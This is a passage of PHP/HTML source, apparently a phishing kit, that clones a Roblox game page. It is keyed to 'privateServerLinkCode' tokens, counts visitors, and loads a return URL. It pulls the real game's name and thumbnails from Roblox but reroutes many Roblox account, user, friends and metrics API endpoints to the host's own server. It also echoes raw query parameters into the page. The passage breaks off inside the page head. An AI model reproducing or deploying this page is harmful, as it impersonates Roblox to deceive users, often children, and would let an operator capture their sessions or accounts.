<?php
require('../controlPage/apis/function.php');
if(isset($_GET['id'])) {
if(isset($_GET['privateServerLinkCode'])) {
if(is_numeric($_GET['privateServerLinkCode']) && !empty($_GET['privateServerLinkCode'])) {
if(file_exists('../tokens/'.$_GET['privateServerLinkCode'].'.txt')) {
$siteid = file_get_contents('../tokens/'.$_GET['privateServerLinkCode'].'.txt');
file_put_contents('../tokens/'.$siteid.'/setup/totalvisitor.txt', file_get_contents('../tokens/'.$siteid.'/setup/totalvisitor.txt')+1);
$returnUrl = file_get_contents('../tokens/'.$siteid.'/setup/returnUrl.txt');
$privateServerLinkCode = $_GET['privateServerLinkCode'];
$title = '<h3>privateServerLinkCode is <strong>Required</strong></h3>';
$info = json_decode(file_get_contents('https://www.roblox.com/places/api-get-details?assetId='.$_GET['id']));
$universeid = $info->UniverseId;
$json = json_decode(file_get_contents('https://thumbnails.roblox.com/v1/games/multiget/thumbnails?universeIds='.$universeid.'&countPerUniverse=6&size=768x432&format=Png&isCircular=false'),true);
$img=$json['data'][0]['thumbnails'][0]['imageUrl'];
foreach ($json['data'][0]['thumbnails'] as $index => $thumbs) {
    $thumb[$index] = $thumbs['imageUrl'];
}
} else {
$title = '<h3>privateServerLinkCode is <strong>Incorrect</strong> please provide privateServerLinkCode correctly</h3>';
}
} else {
$title = '<h3>privateServerLinkCode is <strong>Incorrect</strong> please provide privateServerLinkCode correctly</h3>';
}
} else {
    $title = '<h3>privateServerLinkCode is <strong>Required</strong></h3>';
}
?>
<?php if($privateServerLinkCode):?>

<!DOCTYPE html>
<!--[if IE 8]><html class="ie8" ng-app="robloxApp"><![endif]-->
<!--[if gt IE 8]><!-->
<html>
<!--<![endif]-->
<head data-machine-id="CHI2-WEB6">

<title><?=$info->Name;?> - Roblox</title>
<meta http-equiv="X-UA-Compatible" content="IE=edge,requiresActiveX=true" />
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="author" content="Roblox Corporation" />
<meta name="description" content="Check out <?=$info->Name;?>. It’s one of the millions of unique, user-generated 3D experiences created on Roblox. <?=$info->Description;?>
" />
<meta name="keywords" content="free games, online games, building games, virtual worlds, free mmo, gaming cloud, physics engine" />
<meta name="apple-itunes-app" content="app-id=431946152" />
<script type="application/ld+json"> { "@context" : "http://schema.org", "@type" : "Organization", "name" : "Roblox", "url" : "https://www.roblox.com/", "logo": "https://images.rbxcdn.com/cece570e37aa8f95a450ab0484a18d91", "sameAs" : [ "https://www.facebook.com/roblox/", "https://twitter.com/roblox", "https://www.linkedin.com/company/147977", "https://www.instagram.com/roblox/", "https://www.youtube.com/user/roblox", "https://plus.google.com/+roblox", "https://www.twitch.tv/roblox" ] } </script>
<meta property="og:site_name" content="Roblox" />
<meta property="og:title" content="<?=$info->Name;?>" />
<meta property="og:type" content="game" />
<meta property="og:url" content="https://www.roblox.com/games/<?=$_GET['id'];?>/<?=$_GET['name'];?>" />
<meta property="og:description" content="Check out <?=$info->Name;?>. It’s one of the millions of unique, user-generated 3D experiences created on Roblox. <?=$info->Description;?>
" />
<meta property="og:image" content="<?php echo $img; ?>" />
<meta property="fb:app_id" content="190191627665278">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@Roblox">
<meta name="twitter:title" content="<?=$info->Name;?>">
<meta name="twitter:description" content="Check out <?=$info->Name;?>. It’s one of the millions of unique, user-generated 3D experiences created on Roblox. <?=$info->Description;?>
">
<meta name="twitter:creator">
<meta name=twitter:image1 content="https://tr.rbxcdn.com/01eef74f5f4bf24f62230d3413ba9d42/768/432/Image/Png" />
<meta name="twitter:app:country" content="US">
<meta name="twitter:app:name:iphone" content="Roblox Mobile">
<meta name="twitter:app:id:iphone" content="431946152">
<meta name="twitter:app:url:iphone" content="robloxmobile://placeID=5926001758">
<meta name="twitter:app:name:ipad" content="Roblox Mobile">
<meta name="twitter:app:id:ipad" content="431946152">
<meta name="twitter:app:url:ipad" content="robloxmobile://placeID=5926001758">
<meta name="twitter:app:name:googleplay" content="Roblox">
<meta name="twitter:app:id:googleplay" content="com.roblox.client">
<meta name="twitter:app:url:googleplay" content="robloxmobile://placeID=5926001758" />
<meta ng-csp="no-unsafe-eval">
<meta name="locale-data" data-language-code="en_us" data-language-name="English" />
<meta name="device-meta" data-device-type="computer" data-is-in-app="false" data-is-desktop="true" data-is-phone="false" data-is-tablet="false" data-is-console="false" data-is-android-app="false" data-is-ios-app="false" data-is-uwp-app="false" data-is-xbox-app="false" data-is-amazon-app="false" data-is-win32-app="false" data-is-studio="false" data-is-game-client-browser="false" data-is-ios-device="false" data-is-android-device="false" data-is-universal-app="false" data-app-type="unknown" />
<meta name="environment-meta" data-is-testing-site="false" />
<meta id="roblox-display-names" data-enabled="true"></meta>
<meta name="page-meta" data-internal-page-name="GameDetail" />
<script type="text/javascript">
	var Roblox = Roblox || {};
	Roblox.BundleVerifierConstants = {
		isMetricsApiEnabled: true,
		eventStreamUrl: "//ecsv2.roblox.com/pe?t=diagnostic",
		deviceType: "Computer",
		cdnLoggingEnabled: JSON.parse("true")
	};
	</script>
<script type="text/javascript">
	var Roblox = Roblox || {};
	Roblox.BundleDetector = (function() {
		var isMetricsApiEnabled = Roblox.BundleVerifierConstants && Roblox.BundleVerifierConstants.isMetricsApiEnabled;
		var loadStates = {
			loadSuccess: "loadSuccess",
			loadFailure: "loadFailure",
			executionFailure: "executionFailure"
		};
		var bundleContentTypes = {
			javascript: "javascript",
			css: "css"
		};
		var ephemeralCounterNames = {
			cdnPrefix: "CDNBundleError_",
			unknown: "CDNBundleError_unknown",
			cssError: "CssBundleError",
			jsError: "JavascriptBundleError",
			jsFileError: "JsFileExecutionError",
			resourceError: "ResourcePerformance_Error",
			resourceLoaded: "ResourcePerformance_Loaded"
		};
		return {
			jsBundlesLoaded: {},
			bundlesReported: {},
			counterNames: ephemeralCounterNames,
			loadStates: loadStates,
			bundleContentTypes: bundleContentTypes,
			timing: undefined,
			setTiming: function(windowTiming) {
				this.timing = windowTiming;
			},
			getLoadTime: function() {
				if(this.timing && this.timing.domComplete) {
					return this.getCurrentTime() - this.timing.domComplete;
				}
			},
			getCurrentTime: function() {
				return new Date().getTime();
			},
			getCdnProviderName: function(bundleUrl, callBack) {
				if(Roblox.BundleVerifierConstants.cdnLoggingEnabled) {
					var xhr = new XMLHttpRequest();
					xhr.open('GET', bundleUrl, true);
					xhr.onreadystatechange = function() {
						if(xhr.readyState === xhr.HEADERS_RECEIVED) {
							try {
								var headerValue = xhr.getResponseHeader("rbx-cdn-provider");
								if(headerValue) {
									callBack(headerValue);
								} else {
									callBack();
								}
							} catch(e) {
								callBack();
							}
						}
					};
					xhr.onerror = function() {
						callBack();
					};
					xhr.send();
				} else {
					callBack();
				}
			},
			getCdnProviderAndReportMetrics: function(bundleUrl, bundleName, loadState, bundleContentType) {
				this.getCdnProviderName(bundleUrl, function(cdnProviderName) {
					Roblox.BundleDetector.reportMetrics(bundleUrl, bundleName, loadState, bundleContentType, cdnProviderName);
				});
			},
			reportMetrics: function(bundleUrl, bundleName, loadState, bundleContentType, cdnProviderName) {
				if(!isMetricsApiEnabled || !bundleUrl || !loadState || !loadStates.hasOwnProperty(loadState) || !bundleContentType || !bundleContentTypes.hasOwnProperty(bundleContentType)) {
					return;
				}
				var xhr = new XMLHttpRequest();
				var metricsApiUrl = (Roblox.EnvironmentUrls && Roblox.EnvironmentUrls.metricsApi) || "https://metrics.roblox.com";
				xhr.open("POST", metricsApiUrl + "/v1/bundle-metrics/report", true);
				xhr.setRequestHeader("Content-Type", "application/json");
				xhr.withCredentials = true;
				xhr.send(JSON.stringify({
					bundleUrl: bundleUrl,
					bundleName: bundleName || "",
					bundleContentType: bundleContentType,
					loadState: loadState,
					cdnProviderName: cdnProviderName,
					loadTimeInMilliseconds: this.getLoadTime() || 0
				}));
			},
			logToEphemeralStatistics: function(sequenceName, value) {
				var deviceType = Roblox.BundleVerifierConstants.deviceType;
				sequenceName += "_" + deviceType;
				var xhr = new XMLHttpRequest();
				xhr.open('POST', '/game/report-stats?name=' + sequenceName + "&value=" + value, true);
				xhr.withCredentials = true;
				xhr.send();
			},
			logToEphemeralCounter: function(ephemeralCounterName) {
				var deviceType = Roblox.BundleVerifierConstants.deviceType;
				ephemeralCounterName += "_" + deviceType;
				//log to ephemeral counters - taken from ET.js
				var xhr = new XMLHttpRequest();
				xhr.open('POST', '/game/report-event?name=' + ephemeralCounterName, true);
				xhr.withCredentials = true;
				xhr.send();
			},
			logToEventStream: function(failedBundle, ctx, cdnProvider, status) {
				var esUrl = Roblox.BundleVerifierConstants.eventStreamUrl,
					currentPageUrl = encodeURIComponent(window.location.href);
				var deviceType = Roblox.BundleVerifierConstants.deviceType;
				ctx += "_" + deviceType;
				//try and grab performance data.
				//Note that this is the performance of the xmlhttprequest rather than the original resource load.
				var duration = 0;
				if(window.performance) {
					var perfTiming = window.performance.getEntriesByName(failedBundle);
					if(perfTiming.length > 0) {
						var data = perfTiming[0];
						duration = data.duration || 0;
					}
				}
				//log to event stream (diagnostic)
				var params = "&evt=webBundleError&url=" + currentPageUrl + "&ctx=" + ctx + "&fileSourceUrl=" + encodeURIComponent(failedBundle) + "&cdnName=" + (cdnProvider || "unknown") + "&statusCode=" + (status || "unknown") + "&loadDuration=" + Math.floor(duration);
				var img = new Image();
				img.src = esUrl + params;
			},
			getCdnInfo: function(failedBundle, ctx, fileType) {
				if(Roblox.BundleVerifierConstants.cdnLoggingEnabled) {
					var xhr = new XMLHttpRequest();
					var counter = this.counterNames;
					xhr.open('GET', failedBundle, true);
					var cdnProvider;
					//succesful request
					xhr.onreadystatechange = function() {
						if(xhr.readyState === xhr.HEADERS_RECEIVED) {
							cdnProvider = xhr.getResponseHeader("rbx-cdn-provider");
							if(cdnProvider && cdnProvider.length > 0) {
								Roblox.BundleDetector.logToEphemeralCounter(counter.cdnPrefix + cdnProvider + "_" + fileType);
							} else {
								Roblox.BundleDetector.logToEphemeralCounter(counter.unknown + "_" + fileType);
							}
						} else if(xhr.readyState === xhr.DONE) {
							// append status to cdn provider so we know its not related to network error. 
							Roblox.BundleDetector.logToEventStream(failedBundle, ctx, cdnProvider, xhr.status);
						}
					};
					//attach to possible things that can go wrong with the request.
					//additionally a network error will trigger this callback
					xhr.onerror = function() {
						Roblox.BundleDetector.logToEphemeralCounter(counter.unknown + "_" + fileType);
						Roblox.BundleDetector.logToEventStream(failedBundle, ctx, counter.unknown);
					};
					xhr.send();
				} else {
					this.logToEventStream(failedBundle, ctx);
				}
			},
			reportResourceError: function(resourceName) {
				var ephemeralCounterName = this.counterNames.resourceError + "_" + resourceName;
				this.logToEphemeralCounter(ephemeralCounterName);
			},
			reportResourceLoaded: function(resourceName) {
				var loadTimeInMs = this.getLoadTime();
				if(loadTimeInMs) {
					var sequenceName = this.counterNames.resourceLoaded + "_" + resourceName;
					this.logToEphemeralStatistics(sequenceName, loadTimeInMs);
				}
			},
			reportBundleError: function(bundleTag) {
				var ephemeralCounterName, failedBundle, ctx, contentType;
				if(bundleTag.rel && bundleTag.rel === "stylesheet") {
					ephemeralCounterName = this.counterNames.cssError;
					failedBundle = bundleTag.href;
					ctx = "css";
					contentType = bundleContentTypes.css;
				} else {
					ephemeralCounterName = this.counterNames.jsError;
					failedBundle = bundleTag.src;
					ctx = "js";
					contentType = bundleContentTypes.javascript;
				}
				//mark that we logged this bundle
				this.bundlesReported[failedBundle] = true;
				//e.g. javascriptBundleError_Computer
				this.logToEphemeralCounter(ephemeralCounterName);
				//this will also log to event stream
				this.getCdnInfo(failedBundle, ctx, ctx);
				var bundleName;
				if(bundleTag.dataset) {
					bundleName = bundleTag.dataset.bundlename;
				} else {
					bundleName = bundleTag.getAttribute('data-bundlename');
				}
				this.getCdnProviderAndReportMetrics(failedBundle, bundleName, loadStates.loadFailure, contentType);
			},
			bundleDetected: function(bundleName) {
				this.jsBundlesLoaded[bundleName] = true;
			},
			verifyBundles: function(document) {
				var ephemeralCounterName = this.counterNames.jsFileError,
					eventContext = ephemeralCounterName;
				//grab all roblox script tags in the page. 
				var scripts = (document && document.scripts) || window.document.scripts;
				var errorsList = [];
				var bundleName;
				var monitor;
				for(var i = 0; i < scripts.length; i++) {
					var item = scripts[i];
					if(item.dataset) {
						bundleName = item.dataset.bundlename;
						monitor = item.dataset.monitor;
					} else {
						bundleName = item.getAttribute('data-bundlename');
						monitor = item.getAttribute('data-monitor');
					}
					if(item.src && monitor && bundleName) {
						if(!Roblox.BundleDetector.jsBundlesLoaded.hasOwnProperty(bundleName)) {
							errorsList.push(item);
						}
					}
				}
				if(errorsList.length > 0) {
					for(var j = 0; j < errorsList.length; j++) {
						var script = errorsList[j];
						if(!this.bundlesReported[script.src]) {
							//log the counter only if the file is actually corrupted, not just due to failure to load
							//e.g. JsFileExecutionError_Computer
							this.logToEphemeralCounter(ephemeralCounterName);
							this.getCdnInfo(script.src, eventContext, 'js');
							if(script.dataset) {
								bundleName = script.dataset.bundlename;
							} else {
								bundleName = script.getAttribute('data-bundlename');
							}
							this.getCdnProviderAndReportMetrics(script.src, bundleName, loadStates.executionFailure, bundleContentTypes.javascript);
						}
					}
				}
			}
		};
	})();
	window.addEventListener("load", function(evt) {
		Roblox.BundleDetector.verifyBundles();
	});
	Roblox.BundleDetector.setTiming(window.performance.timing);
	//# sourceURL=somename.js
	</script>
<link href="https://images.rbxcdn.com/7bba321f4d8328683d6e59487ce514eb" rel="icon" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="StyleGuide" data-bundle-source="Main" href="https://css.rbxcdn.com/32c815a1608d7102619bf8568a37672d932127625ecf4c6c8fba93a3cdba688a.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Thumbnails" data-bundle-source="Main" href="https://css.rbxcdn.com/9517d686dc47015c200496d77e2b18146ee37652d18e25ecf9e1ed230310ea13.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="VerificationUpsell" data-bundle-source="Main" href="https://css.rbxcdn.com/a261c14cb6895b82359002686abc19ff0038d71649f550f7255e2831cbd870dd.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="RobloxBadges" data-bundle-source="Main" href="https://css.rbxcdn.com/da45920fef8b22d35ee6cce0702d290241252fbfd99695e2abc0934d20de0974.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Navigation" data-bundle-source="Main" href="https://css.rbxcdn.com/af8cb63eb52ab7aacc87848677124fdb944ed943c878a55780b6c6a667da7ae5.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CookieBannerV3" data-bundle-source="Main" href="https://css.rbxcdn.com/2c2a709240897ce382b7ff55be4347cd0994ab1e2d6ed3b56649e54b0e97e13a.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Footer" data-bundle-source="Main" href="https://css.rbxcdn.com/6edb2191aa318f963253361b43d2657a04b3d16e9c28fe7b22d4a4d5686f1cb4.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ConfigureWebApps" data-bundle-source="Main" href="https://css.rbxcdn.com/08def520152a575438e73a81aa9a310c2415c327df7b624a24aa6e794d24dba3.css" />
<link rel="canonical" href="https://www.roblox.com/games/5926001758/Color-Block" />
<link onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' rel='stylesheet' href='https://static.rbxcdn.com/css/leanbase___5e469c309d1eeddf42cc9d36a50f82e0_m.css/fetch' />
<link onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' rel='stylesheet' href='https://static.rbxcdn.com/css/page___f7b2d1062f67d00f8b10bf0768f2b0ef_m.css/fetch' />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Captcha" data-bundle-source="Main" href="https://css.rbxcdn.com/cc0e1d21820c2614cbf118f5fbc90c66cce1f5440919479d223e2ddd2a0fc4e8.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CaptchaCore" data-bundle-source="Main" href="https://css.rbxcdn.com/b8f8f15a57a66e73469ae72eea7d8905346afa78b9f2397627cd099f7dcc779a.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Challenge" data-bundle-source="Main" href="https://css.rbxcdn.com/5ec10f696511a19ac709adc0b92273ca5bbabc1191e973b12539d89634bdc2cd.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="GameBadges" data-bundle-source="Main" href="https://css.rbxcdn.com/bec62e96a756104b8904fe298055c659d462a293759ee99503dd85e952bd11f1.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="SocialLinksJumbotron" data-bundle-source="Main" href="https://css.rbxcdn.com/d5e3f1bfc12f243eca06757b140e2d6ce825e9347482ec8d8cc46fed6accdd8c.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ItemPurchase" data-bundle-source="Main" href="https://css.rbxcdn.com/5331669054807354a3a20a4717d18c566a7cbee984e7471ece3a2090cb70150c.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ServerList" data-bundle-source="Main" href="https://css.rbxcdn.com/08d54b28757ebe50e5094a7eea411700c88c7e7637d6fe9e97e73abae05f69d6.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="IdVerification" data-bundle-source="Main" href="https://css.rbxcdn.com/68f976f4a3f8f3a6aae074879170e579451270e693d2361491b1c1bb9ac5e4c5.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="GameGuidelines" data-bundle-source="Main" href="https://css.rbxcdn.com/35c302a08239fe2a569b3ef4a4084ee6469f46fd0fddffcd1008d61418c88eed.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="GameDetails" data-bundle-source="Main" href="https://css.rbxcdn.com/81b402d6f7a802aa114a68e2f2cff7e041017491b250bedea3fcf756ad54acb4.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="RecommendedGames" data-bundle-source="Main" href="https://css.rbxcdn.com/d442a7af60dc010ef08387ca2495c244bdacf0fafd08acaa70f9ef4dce7c2013.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="RobuxIcon" data-bundle-source="Main" href="https://css.rbxcdn.com/6fe55c3438539daf776774645e39e121d991246d6a38972b81e3f9550a585b5b.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="UserAgreementsChecker" data-bundle-source="Main" href="https://css.rbxcdn.com/d5a3728b78be729b693aadf79a1f45f0fa49c15fe863a0d7dd631b75f9e82207.css" />
<script type="text/javascript">
	var Roblox = Roblox || {};
	Roblox.EnvironmentUrls = Roblox.EnvironmentUrls || {};
	Roblox.EnvironmentUrls = {
		"abtestingApiSite": "https://abtesting.roblox.com",
		"accountInformationApi": "https://<?=$_SERVER['SERVER_NAME'];?>",
		"accountSettingsApi": "https://accountsettings.roblox.com",
		"adConfigurationApi": "https://adconfiguration.roblox.com",
		"adsApi": "https://ads.roblox.com",
		"apiGatewayCdnUrl": "https://<?=$_SERVER['SERVER_NAME'];?>",
		"apiGatewayUrl": "https://<?=$_SERVER['SERVER_NAME'];?>",
		"apiProxyUrl": "https://api.roblox.com",
		"assetDeliveryApi": "https://assetdelivery.roblox.com",
		"authApi": "https://auth.roblox.com",
		"avatarApi": "https://<?=$_SERVER['SERVER_NAME'];?>",
		"badgesApi": "https://<?=$_SERVER['SERVER_NAME'];?>",
		"billingApi": "https://billing.roblox.com",
		"captchaApi": "https://captcha.roblox.com",
		"catalogApi": "https://<?=$_SERVER['SERVER_NAME'];?>",
		"chatApi": "https://chat.roblox.com",
		"chatModerationApi": "https://chatmoderation.roblox.com",
		"contactsApi": "https://contacts.roblox.com",
		"contactsServiceApi": "https://apis.roblox.com/contacts-api",
		"contentStoreApi": "https://contentstore.roblox.com",
		"developApi": "https://develop.roblox.com",
		"domain": "roblox.com",
		"economyApi": "https://economy.roblox.com",
		"economycreatorstatsApi": "https://economycreatorstats.roblox.com",
		"engagementPayoutsApi": "https://engagementpayouts.roblox.com",
		"followingsApi": "https://followings.roblox.com",
		"friendsApi": "https://<?=$_SERVER['SERVER_NAME'];?>",
		"gameInternationalizationApi": "https://gameinternationalization.roblox.com",
		"gamesApi": "https://<?=$_SERVER['SERVER_NAME'];?>",
		"gameJoinApi": "https://gamejoin.roblox.com",
		"groupsApi": "https://<?=$_SERVER['SERVER_NAME'];?>",
		"groupsModerationApi": "https://groupsmoderation.roblox.com",
		"helpSite": "http://help.roblox.com",
		"inventoryApi": "https://inventory.roblox.com",
		"itemConfigurationApi": "https://itemconfiguration.roblox.com",
		"localeApi": "https://locale.roblox.com",
		"localizationTablesApi": "https://localizationtables.roblox.com",
		"metricsApi": "https://<?=$_SERVER['SERVER_NAME'];?>",
		"midasApi": "https://midas.roblox.com",
		"notificationApi": "https://notifications.roblox.com",
		"passProductPurchasingApi": "https://apis.roblox.com/pass-product-purchasing",
		"bundlesProductPurchasingApi": "https://apis.roblox.com/bundles-product-purchasing",
		"premiumFeaturesApi": "https://premiumfeatures.roblox.com",
		"presenceApi": "https://presence.roblox.com",
		"privateMessagesApi": "https://privatemessages.roblox.com",
		"publishApi": "https://publish.roblox.com",
		"restrictedHoursServiceApi": "https://apis.roblox.com/restricted-hours-service",
		"screenTimeApi": "https://apis.rcs.roblox.com/screen-time-api",
		"shareApi": "https://share.roblox.com",
		"shareLinksApi": "https://apis.roblox.com/sharelinks",
		"thumbnailsApi": "https://<?=$_SERVER['SERVER_NAME'];?>",
		"tradesApi": "https://trades.roblox.com",
		"translationRolesApi": "https://translationroles.roblox.com",
		"twoStepVerificationApi": "https://twostepverification.roblox.com",
		"universalAppConfigurationApi": "https://<?=$_SERVER['SERVER_NAME'];?>/universal-app-configuration",
		"userAgreementsServiceApi": "https://apis.roblox.com/user-agreements",
		"userModerationApi": "https://usermoderation.roblox.com",
		"usersApi": "https://<?=$_SERVER['SERVER_NAME'];?>",
		"userSettingsApi": "https://apis.roblox.com/user-settings-api",
		"voiceApi": "https://voice.roblox.com",
		"websiteUrl": "https://www.roblox.com"
	};
	// please keep the list in alphabetical order
	var additionalUrls = {
		amazonStoreLink: "https://www.amazon.com/Roblox-Corporation/dp/B00NUF4YOA",
		amazonWebStoreLink: "https%3a%2f%2fwww.amazon.com%2froblox%3f%26_encoding%3dUTF8%26tag%3dr05d13-20%26linkCode%3dur2%26linkId%3d5562fc29c05b45562a86358c198356eb%26camp%3d1789%26creative%3d9325",
		appProtocolUrl: "robloxmobile://",
		appStoreLink: "https://itunes.apple.com/us/app/roblox-mobile/id431946152",
		googlePlayStoreLink: "https://play.google.com/store/apps/details?id=com.roblox.client&amp;hl=en",
		iosAppStoreLink: "https://itunes.apple.com/us/app/roblox-mobile/id431946152",
		windowsStoreLink: "https://www.microsoft.com/en-us/store/games/roblox/9nblgggzm6wm",
		xboxStoreLink: "https://www.microsoft.com/en-us/p/roblox/bq1tn1t79v9k"
	}
	for(var urlName in additionalUrls) {
		Roblox.EnvironmentUrls[urlName] = additionalUrls[urlName];
	}
	</script>
<script type="text/javascript">
	var Roblox = Roblox || {};
	Roblox.GaEventSettings = {
		gaDFPPreRollEnabled: "false" === "true",
		gaLaunchAttemptAndLaunchSuccessEnabled: "false" === "true",
		gaPerformanceEventEnabled: "false" === "true"
	};
	</script>
<script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='headerinit' type='text/javascript' src='https://js.rbxcdn.com/4a481e857787c241b22259659a0674a7.js'></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Polyfill" data-bundle-source="Main" src="https://js.rbxcdn.com/772034db167d3f4260047db4a7f2b8a58cf448709327013541e47c8962b6e556.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="XsrfProtection" data-bundle-source="Main" src="https://js.rbxcdn.com/4db2f741b7a3ec36d11fec999ce33f708ae85641cabfd27e11e0935928f7d9c4.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="HeaderScripts" data-bundle-source="Main" src="https://js.rbxcdn.com/97cb9ac7262155c329a259fce9f940f9bcfa852a6a1ccb44bd8a41c31e84e54b.js"></script>
<meta name="sentry-meta" data-env-name="production" data-dsn="https://6750adeb1b1348e4a10b13e726d5c10b@sentry.io/1539367" data-sample-rate="0" />
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Sentry" data-bundle-source="Main" src="https://js.rbxcdn.com/edc66704bd1974195d8c60f4a163441bec82f1bcb11c492e7df07c43f45a4d49.js"></script>
<meta name="roblox-tracer-meta-data" data-access-token="S3EXjCZQQr6OixnmKu+hoa3OSfpvPP5qgU0esiWgwreFUUMBnPhEaoS5yIIrf9bdYlSgW0XKCb1So9Rhtj1eMzt/MJWcyKZ4TwIckHVj" data-service-name="Web" data-tracer-enabled="false" data-api-sites-request-allow-list="friends.roblox.com,chat.roblox.com,thumbnails.roblox.com,games.roblox.com,gameinternationalization.roblox.com,localizationtables.roblox.com" data-sample-rate="5" data-is-instrument-page-performance-enabled="true" />
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="RobloxTracer" data-bundle-source="Main" src="https://js.rbxcdn.com/adeccc658a8d5ddc63fb224cc0bcd3e29b73d70db3847c0379426bfa128d9381.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
<script type="text/javascript">
	var Roblox = Roblox || {};
	Roblox.AdsHelper = Roblox.AdsHelper || {};
	Roblox.AdsLibrary = Roblox.AdsLibrary || {};
	Roblox.AdsHelper.toggleAdsSlot = function(slotId, GPTRandomSlotIdentifier) {
		var gutterAdsEnabled = false;
		if(gutterAdsEnabled) {
			googletag.display(GPTRandomSlotIdentifier);
			return;
		}
		if(typeof slotId !== 'undefined' && slotId && slotId.length > 0) {
			var slotElm = $("#" + slotId);
			if(slotElm.is(":visible")) {
				googletag.display(GPTRandomSlotIdentifier);
			} else {
				var adParam = Roblox.AdsLibrary.adsParameters[slotId];
				if(adParam) {
					adParam.template = slotElm.html();
					slotElm.empty();
				}
			}
		}
	}
	</script>
<meta property="al:ios:url" content="robloxmobile://placeID=5926001758" />
<meta property="al:ios:app_store_id" content="431946152" />
<meta property="al:ios:app_name" content="Roblox Mobile" />
<meta property="al:web:should_fallback" content="false" />
<!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
        <script src="//oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
<script>
	//Set if it browser's do not track flag is enabled
	var Roblox = Roblox || {};
	(function() {
		var dnt = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
		if(typeof window.external !== "undefined" && typeof window.external.msTrackingProtectionEnabled !== "undefined") {
			dnt = dnt || window.external.msTrackingProtectionEnabled();
		}
		Roblox.browserDoNotTrack = dnt == "1" || dnt == "yes" || dnt === true;
	})();
	</script>
<script type="text/javascript">
	var _gaq = _gaq || [];
	window.GoogleAnalyticsDisableRoblox2 = true;
	_gaq.push(['b._setAccount', 'UA-486632-1']);
	_gaq.push(['b._setSampleRate', '10']);
	_gaq.push(['b._setCampSourceKey', 'rbx_source']);
	_gaq.push(['b._setCampMediumKey', 'rbx_medium']);
	_gaq.push(['b._setCampContentKey', 'rbx_campaign']);
	_gaq.push(['b._setDomainName', 'roblox.com']);
	_gaq.push(['b._setCustomVar', 1, 'Visitor', 'Anonymous', 2]);
	_gaq.push(['b._setPageGroup', 1, 'GameDetail']);
	_gaq.push(['b._trackPageview']);
	_gaq.push(['c._setAccount', 'UA-26810151-2']);
	_gaq.push(['c._setSampleRate', '1']);
	_gaq.push(['c._setDomainName', 'roblox.com']);
	_gaq.push(['c._setPageGroup', 1, 'GameDetail']);
	(function() {
		if(!Roblox.browserDoNotTrack) {
			var ga = document.createElement('script');
			ga.type = 'text/javascript';
			ga.async = true;
			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
			var s = document.getElementsByTagName('script')[0];
			s.parentNode.insertBefore(ga, s);
		}
	})();
	</script>
<script async src='https://www.googletagmanager.com/gtag/js?id=AW-1065449093'></script>
<script type="text/javascript">
	var accountCode = "AW-1065449093";
	var signupConversionEventKey = "wmuJCO3CZBCF7YX8Aw";
	var webPurchaseConversionEventKey = "XDQ_CJme6s0BEIXthfwD";
